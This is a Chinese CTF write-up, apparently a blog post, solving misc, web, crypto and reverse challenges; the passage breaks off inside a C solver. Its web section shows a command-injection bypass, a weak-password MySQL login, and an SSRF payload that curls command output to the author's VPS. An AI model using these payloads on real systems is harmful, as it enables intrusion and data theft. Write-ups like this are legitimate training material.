alt="image-20240607172534679"></p><p>利用命令分别提取数据</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607182520917-1525444214.png" alt="image-20240607182517591"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607182547664-1913152725.png" alt="image-20240607182544589"></p><p>利用在线将其转换成文件</p><ul><li>0x4500文件，是一个压缩包</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607182800749-1063011295.png" alt="image-20240607182758675"></p><p>发现是一个带锁的gpg文件，将压缩包给名为1.zip</p><ul><li>0x6421是一个pgp文件</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607183022938-979978696.png" alt="image-20240607183020136"></p><p>将文件给名为2.pgp</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607183256747-1459349315.png" alt="image-20240607183254268"></p><p>提取gpg文件发现需要密码，结合题目，输入密码15f9792dba5c，拿到gpg文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607183431208-686758359.png" alt="image-20240607183428870"></p><p>利用PGPTool工具进行解密</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607185345779-1261008817.png" alt="image-20240607185342884"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607185418567-2134737422.png" alt="image-20240607185416426"></p><p>密码为最开始根据题目描述得到的数据，e9b0-ea5f9bae这个面膜不对，测试后发现还需要再逆序一下才行</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607185958858-329278782.png" alt="image-20240607185956491"></p><p>拿到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190113553-606034123.png" alt="image-20240607190111445"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h2><p>测试发现能够执行<code>php -v</code>命令</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518132251631-1490700329.png" alt="image-20240518132248207"></p><p>因为存在过滤以及特殊函数<code>escapeshellcmd</code>，导致命令不能正常执行，可以构造十六进制数据结合<code>php -r</code>进行绕过</p><p><a href="https://lzltool.cn/Toolkit/ConvertStringToHexadecimal">在线字符串/十六进制互相转换—LZL在线工具 (lzltool.cn)</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518132828898-898802066.png" alt="image-20240518132825429"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607112312423-1255600154.png" alt="image-20240518134217969"></p><p>测试后发现根目录没有flag，利用<code>php</code>读<code>/etc/passwd</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518132332745-1157496133.png" alt="image-20240518132329161"></p><p>发现Mysql服务，根据root用户的账户名和密码，弱口令尝试登陆root/root</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518133750180-701643652.png" alt="image-20240518133746619"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518134922083-1666679704.png" alt="image-20240518134917547"></p><p>连接成功，进入PHP_CMS数据库，再查询表</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518133916900-1553976194.png" alt="image-20240518133913511"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518134838056-1875913792.png" alt="image-20240518134834000"></p><p>继续查数据</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518134413609-938358665.png" alt="image-20240518134410050"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518134735151-1797594180.png" alt="image-20240518134731217"></p><h2 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h2><p>根据第一天的flag内容提示需要伪造”REMOTE_ADDR”，但是这个不可伪造，需要通过ssrf来打，通过网上搜索发现该cms存在qrcode+ssrf漏洞</p><p><a href="https://www.xunruicms.com/bug/">https://www.xunruicms.com/bug/</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519112818817-518530127.png" alt="image-20240519112814457"></p><p>github源码审计找到qrcode函数</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519112627631-54222019.png" alt="image-20240519112621674"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519150556186-876744862.png" alt="image-20240519150551391"></p><p><a href="https://www.xunruicms.com/doc/444.html">https://www.xunruicms.com/doc/444.html</a></p><p>查询文档发现参数可控，可以通过构造url来进行SSRF伪造进行外带，但是需要是一张<strong>图片</strong>能够使其识别</p><p>在自己的vps上写个文件<code>shell.php</code>，内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define width 8888</span></span><br><span class="line"><span class="comment">#define height 8888</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:http://127.0.0.1/flag.php?cmd=curl http://vpsip:port/?id=$(id)&quot;</span>);</span><br></pre></td></tr></table></figure><p>大概意思就是通过定义宽高来使其成为一张图片，绕过检测，再利用302跳转打SSRF</p><p>本地起一个python服务用来监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519113448411-499464643.png" alt="image-20240519113443683"></p><p>访问题目：</p><p><code>url/index.php?s=api&amp;c=api&amp;m=qrcode&amp;size=100&amp;level=10&amp;thumb=http://vpsip/shell.php&amp;text=1</code></p><p>执行命令成功，利用<code>ls /|sed -n 1p</code>查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519113835586-899329325.png" alt="image-20240519113830661">发现flag无法读取，继续遍历目录发现<code>readflag</code>可执行文件，输出readflag执行结果拿到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define width 8888</span></span><br><span class="line"><span class="comment">#define height 8888</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:http://127.0.0.1/flag.php?cmd=curl http://vpsip:port/?id=$(echo `/readflag`)&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519114409376-1817342022.png" alt="image-20240519114404928"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="OvO"><a href="#OvO" class="headerlink" title="OvO"></a>OvO</h2><p>先将e等式化简</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153056089-343697192.png" alt="image-20240519153050449"></p><p>可以看到化简方程最后只有p是未知，已知高位条件下e=(2+k)n，那么k=e//n-2，代入即可解出p的高位</p><p>已知p高位泄露直接打脚本即可</p><p>解题代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967</span></span><br><span class="line">e = <span class="number">37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104</span></span><br><span class="line">c = <span class="number">14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823</span></span><br><span class="line"></span><br><span class="line">k = e // n - <span class="number">2</span></span><br><span class="line">tmp = <span class="number">65537</span> + (k+<span class="number">2</span>)*n + (k+<span class="number">2</span>)+<span class="number">1</span></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(RealField(<span class="number">1024</span>))</span><br><span class="line">f = e*x - (<span class="number">2</span>*(k+<span class="number">1</span>)*x^<span class="number">2</span> + (k+<span class="number">2</span>)*n + tmp*x)</span><br><span class="line">res = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> res:</span><br><span class="line">    p_high = <span class="built_in">int</span>(root[<span class="number">0</span>])</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f1 = x + p_high</span><br><span class="line">    roots = f1.monic().small_roots(X=<span class="number">2</span>^<span class="number">200</span>,beta=<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        p = <span class="built_in">int</span>(roots[<span class="number">0</span>]) + p_high</span><br><span class="line">        q = n // p</span><br><span class="line">        e = <span class="number">65537</span> + k * p + (k+<span class="number">2</span>) * ((p+<span class="number">1</span>) * (q+<span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line">        d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153140820-1858714848.png" alt="image-20240519153128716"></p><h2 id="古典密文"><a href="#古典密文" class="headerlink" title="古典密文"></a>古典密文</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153315904-1153606556.png" alt="image-20240519153310923"></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="asm-re"><a href="#asm-re" class="headerlink" title="asm_re"></a>asm_re</h2><p>一开始还想还原这个ida工程文件hhh，发现根本做不到，后面纯看arm汇编代码，直接手撕就好，加密逻辑在这儿，密文一开始还找半天，后面发现应该是存在变量unk_100003F10里面<br><img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716107133474-6dd6bd70-f747-4e79-82d0-bd71353915ef.png#averageHue=%23302c2a&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=273&amp;id=ufa235f5b&amp;originHeight=341&amp;originWidth=1106&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=47929&amp;status=done&amp;style=none&amp;taskId=u632123d7-babc-4de8-b5f9-4bbaab5c3b8&amp;title=&amp;width=884.8" alt="image.png"></p><p>搓出脚本之后也还是卡了一小会儿，最后反应过来大小端的问题，改一下小端就好了，爆破一下直接出<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">k = [</span><br><span class="line">    <span class="number">0x1fd7</span>, <span class="number">0x21b7</span>, <span class="number">0x1e47</span>, <span class="number">0x2027</span>, <span class="number">0x26e7</span>, <span class="number">0x10d7</span>, <span class="number">0x1127</span>, <span class="number">0x2007</span>,</span><br><span class="line">    <span class="number">0x11c7</span>, <span class="number">0x1e47</span>, <span class="number">0x1017</span>, <span class="number">0x1017</span>, <span class="number">0x11f7</span>, <span class="number">0x2007</span>, <span class="number">0x1037</span>, <span class="number">0x1107</span>,</span><br><span class="line">    <span class="number">0x1f17</span>, <span class="number">0x10d7</span>, <span class="number">0x1017</span>, <span class="number">0x1017</span>, <span class="number">0x1f67</span>, <span class="number">0x1017</span>, <span class="number">0x11c7</span>, <span class="number">0x11c7</span>,</span><br><span class="line">    <span class="number">0x1017</span>, <span class="number">0x1fd7</span>, <span class="number">0x1f17</span>, <span class="number">0x1107</span>, <span class="number">0x0f47</span>, <span class="number">0x1127</span>, <span class="number">0x1037</span>, <span class="number">0x1e47</span>,</span><br><span class="line">    <span class="number">0x1037</span>, <span class="number">0x1fd7</span>, <span class="number">0x1107</span>, <span class="number">0x1fd7</span>, <span class="number">0x1107</span>, <span class="number">0x2787</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(k)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>): </span><br><span class="line">        <span class="keyword">if</span> (((j * <span class="built_in">ord</span>(<span class="string">&#x27;P&#x27;</span>) + <span class="number">0x14</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>)) + <span class="number">0x1e</span>) == k[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j), end=<span class="string">&quot;&quot;</span>) </span><br><span class="line"><span class="comment">#flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125;</span></span><br></pre></td></tr></table></figure><h2 id="whereThel1b"><a href="#whereThel1b" class="headerlink" title="whereThel1b"></a>whereThel1b</h2><p>还真是第一次遇见这种，给了个so和一个py文件，一开始的想法是能不能给so解包之类的，因为py文件里面密文给了，就差一个加密逻辑，找了一大圈还是没找到，最后还是想到了调一下so文件，像调安卓那样<br>动调起来锁定出了两个函数，得知输入的数据先经过base64编码之后再进行的异或<img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716109884779-17e06c83-6fc5-4814-bd3c-48dc2b4e2d3b.png#averageHue=%23bff8fb&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=158&amp;id=u3e8cb98a&amp;originHeight=197&amp;originWidth=863&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=26226&amp;status=done&amp;style=none&amp;taskId=u35d4d91b-bb47-4e0d-820f-1198f5bce0c&amp;title=&amp;width=690.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716109932327-1f17bb8d-f10b-4e67-b587-873ccedb086b.png#averageHue=%23c0f9fc&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=153&amp;id=u8cca14f4&amp;originHeight=191&amp;originWidth=472&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=12594&amp;status=done&amp;style=none&amp;taskId=u35d995fb-98a6-4327-9277-5d0144be3a2&amp;title=&amp;width=377.6" alt="image.png"><br>加密逻辑知道了，但是不知道异或的值是什么，一开始以为是存在r18里面的，最后调了一下找不到规律，最后想到重新写一份密文输入，然后把加密之后的数据输出一下，前后异或得到所需异或的值，想办法输入一个输构造出经过base64编码之后长度为56的数<br><img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716110117071-af6369b0-a2ff-4e9b-a55e-3bb343104144.png#averageHue=%23533272&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=225&amp;id=uc5ca83a7&amp;originHeight=281&amp;originWidth=586&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=32753&amp;status=done&amp;style=none&amp;taskId=u021a7de5-9bc0-4032-b65f-eb37a4f769e&amp;title=&amp;width=468.8" alt="image.png"><br>exp:<br>其中aa是上图构造的“55555555555555555555555555555555555555555555”的base64之后的值，然后bb是运行上图之后得到的异或之后的值，最后运行出来的结果解一下base64就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">encry = [<span class="number">108</span>, <span class="number">117</span>, <span class="number">72</span>, <span class="number">80</span>, <span class="number">64</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">69</span>, <span class="number">115</span>, <span class="number">94</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">115</span>, <span class="number">71</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">56</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">2</span>, <span class="number">84</span>, <span class="number">75</span>, <span class="number">127</span>, <span class="number">68</span>, <span class="number">103</span>, <span class="number">85</span>, <span class="number">105</span>, <span class="number">113</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">113</span>, <span class="number">70</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">124</span>, <span class="number">93</span>, <span class="number">120</span>, <span class="number">104</span>, <span class="number">108</span>, <span class="number">106</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">75</span>, <span class="number">93</span>, <span class="number">68</span>, <span class="number">121</span>, <span class="number">26</span>]</span><br><span class="line"></span><br><span class="line">aa = [<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>]</span><br><span class="line">bb = [<span class="number">120</span>, <span class="number">76</span>, <span class="number">101</span>, <span class="number">9</span>, <span class="number">84</span>, <span class="number">86</span>, <span class="number">69</span>, <span class="number">17</span>, <span class="number">81</span>, <span class="number">77</span>, <span class="number">103</span>, <span class="number">4</span>, <span class="number">93</span>, <span class="number">74</span>, <span class="number">67</span>, <span class="number">20</span>, <span class="number">67</span>, <span class="number">116</span>, <span class="number">93</span>, <span class="number">35</span>, <span class="number">70</span>, <span class="number">100</span>, <span class="number">83</span>, <span class="number">22</span>, <span class="number">125</span>, <span class="number">68</span>, <span class="number">119</span>, <span class="number">28</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">92</span>, <span class="number">34</span>, <span class="number">72</span>, <span class="number">122</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">101</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">18</span>, <span class="number">72</span>, <span class="number">66</span>, <span class="number">78</span>, <span class="number">37</span>, <span class="number">105</span>, <span class="number">124</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">98</span>, <span class="number">16</span>, <span class="number">94</span>, <span class="number">87</span>, <span class="number">102</span>, <span class="number">18</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(aa)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((aa[i]^bb[i]))^encry[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#ZmxhZ3s3ZjlhMmQzYy0wN2RlLTExZWYtYmU1ZS1jZjFlODg2NzRjMGJ9</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716110388906-19b8d9e8-944d-4754-abc1-bb32539cf928.png#averageHue=%23fbfafa&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=321&amp;id=u21ca8627&amp;originHeight=401&amp;originWidth=1001&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=29873&amp;status=done&amp;style=none&amp;taskId=u57d8f6b1-9320-4cba-8df7-3614d3a13ff&amp;title=&amp;width=800.8" alt="image.png"></p><h2 id="gdb-debug"><a href="#gdb-debug" class="headerlink" title="gdb_debug"></a>gdb_debug</h2><p>进入主函数之后逻辑还是相当清楚的，锁定了一下伪随机数<br><img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716108171134-d0c78cae-29d9-40d8-98cb-2cc66768bf09.png#averageHue=%23c6fbfe&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=30&amp;id=u86f42e8a&amp;originHeight=37&amp;originWidth=279&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=1960&amp;status=done&amp;style=none&amp;taskId=uc34bcd71-5b39-4a72-8912-972a5d90723&amp;title=&amp;width=223.2" alt="image.png"><br>动调跑起来取出随机数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xd9</span>, <span class="number">0x0f</span>, <span class="number">0x18</span>, <span class="number">0xBD</span>, <span class="number">0xC7</span>, <span class="number">0x16</span>, <span class="number">0x81</span>, <span class="number">0xbe</span>, <span class="number">0xf8</span>, <span class="number">0x4A</span>, <span class="number">0x65</span>, <span class="number">0xf2</span>, <span class="number">0x5D</span>, <span class="number">0xab</span>, <span class="number">0x74</span>, <span class="number">0x33</span>, <span class="number">0xd4</span>, <span class="number">0xa5</span>, <span class="number">0x67</span>, <span class="number">0x98</span>, <span class="number">0x9f</span>, <span class="number">0x7E</span>, <span class="number">0x2B</span>, <span class="number">0x5D</span>, <span class="number">0xc2</span>, <span class="number">0xaf</span>, <span class="number">0x8e</span>, <span class="number">0x3A</span>, <span class="number">0x4C</span>, <span class="number">0xa5</span>, <span class="number">0X75</span>, <span class="number">0X25</span>, <span class="number">0xb4</span>, <span class="number">0x8d</span>, <span class="number">0xe3</span>, <span class="number">0X7B</span>, <span class="number">0xa3</span>, <span class="number">0x64</span></span><br></pre></td></tr></table></figure><p>然后直接从后往前逆就好<br>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> indexArray[<span class="number">38</span>];</span><br><span class="line">    <span class="type">int</span> buffer[<span class="number">38</span>];</span><br><span class="line">    <span class="type">int</span> outputBuffer[<span class="number">38</span>];</span><br><span class="line">    <span class="type">int</span> originalNumbers[] = &#123;</span><br><span class="line">        <span class="number">94</span>, <span class="number">30</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">157</span>, <span class="number">32</span>, <span class="number">134</span>, <span class="number">99</span>, <span class="number">227</span>, <span class="number">214</span>,</span><br><span class="line">        <span class="number">182</span>, <span class="number">105</span>, <span class="number">24</span>, <span class="number">193</span>, <span class="number">153</span>, <span class="number">168</span>, <span class="number">188</span>, <span class="number">5</span>, <span class="number">121</span>, <span class="number">159</span>,</span><br><span class="line">        <span class="number">25</span>, <span class="number">110</span>, <span class="number">218</span>, <span class="number">76</span>, <span class="number">117</span>, <span class="number">174</span>, <span class="number">192</span>, <span class="number">185</span>, <span class="number">247</span>, <span class="number">122</span>,</span><br><span class="line">        <span class="number">149</span>, <span class="number">77</span>, <span class="number">23</span>, <span class="number">135</span>, <span class="number">148</span>, <span class="number">84</span>, <span class="number">191</span>, <span class="number">185</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> byteSequence[] = &#123;</span><br><span class="line">        <span class="number">128</span>, <span class="number">180</span>, <span class="number">64</span>, <span class="number">184</span>, <span class="number">148</span>, <span class="number">200</span>, <span class="number">52</span>, <span class="number">101</span>, <span class="number">238</span>, <span class="number">69</span>,</span><br><span class="line">        <span class="number">215</span>, <span class="number">157</span>, <span class="number">60</span>, <span class="number">136</span>, <span class="number">140</span>, <span class="number">169</span>, <span class="number">107</span>, <span class="number">174</span>, <span class="number">125</span>, <span class="number">135</span>,</span><br><span class="line">        <span class="number">214</span>, <span class="number">135</span>, <span class="number">15</span>, <span class="number">218</span>, <span class="number">70</span>, <span class="number">100</span>, <span class="number">57</span>, <span class="number">147</span>, <span class="number">169</span>, <span class="number">144</span>,</span><br><span class="line">        <span class="number">184</span>, <span class="number">113</span>, <span class="number">131</span>, <span class="number">232</span>, <span class="number">172</span>, <span class="number">201</span>, <span class="number">231</span>, <span class="number">83</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> shuffledIndices[<span class="number">38</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++) &#123;</span><br><span class="line">        shuffledIndices[i] = originalNumbers[i] ^ byteSequence[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> encryptionKeys[] = &#123;<span class="number">0xd9</span>, <span class="number">0x0f</span>, <span class="number">0x18</span>, <span class="number">0xBD</span>, <span class="number">0xC7</span>, <span class="number">0x16</span>, <span class="number">0x81</span>, <span class="number">0xbe</span>, <span class="number">0xf8</span>, <span class="number">0x4A</span>, <span class="number">0x65</span>, <span class="number">0xf2</span>, <span class="number">0x5D</span>, <span class="number">0xab</span>, <span class="number">0x74</span>, <span class="number">0x33</span>, <span class="number">0xd4</span>, <span class="number">0xa5</span>, <span class="number">0x67</span>, <span class="number">0x98</span>, <span class="number">0x9f</span>, <span class="number">0x7E</span>, <span class="number">0x2B</span>, <span class="number">0x5D</span>, <span class="number">0xc2</span>, <span class="number">0xaf</span>, <span class="number">0x8e</span>, <span class="number">0x3A</span>, <span class="number">0x4C</span>, <span class="number">0xa5</span>, <span class="number">0x75</span>, <span class="number">0x25</span>, <span class="number">0xb4</span>, <span class="number">0x8d</span>, <span class="number">0xe3</span>, <span class="number">0x7B</span>, <span class="number">0xa3</span>, <span class="number">0x64</span>&#125;;</span><br><span class="line">    <span class="type">int</span> permutationOrder[] = &#123;<span class="number">33</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">31</span>, <span class="number">10</span>, <span class="number">29</span>, <span class="number">9</span>, <span class="number">24</span>, <span class="number">26</span>, <span class="number">11</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> dataXor[] = &#123;<span class="number">0xBF</span>, <span class="number">0xD7</span>, <span class="number">0x2E</span>, <span class="number">0xDA</span>, <span class="number">0xEE</span>, <span class="number">0xA8</span>, <span class="number">0x1A</span>, <span class="number">0x10</span>, <span class="number">0x83</span>, <span class="number">0x73</span>, <span class="number">0xAC</span>, <span class="number">0xF1</span>, <span class="number">0x06</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0x88</span>, <span class="number">0x04</span>, <span class="number">0xD7</span>, <span class="number">0x12</span>, <span class="number">0xFE</span>, <span 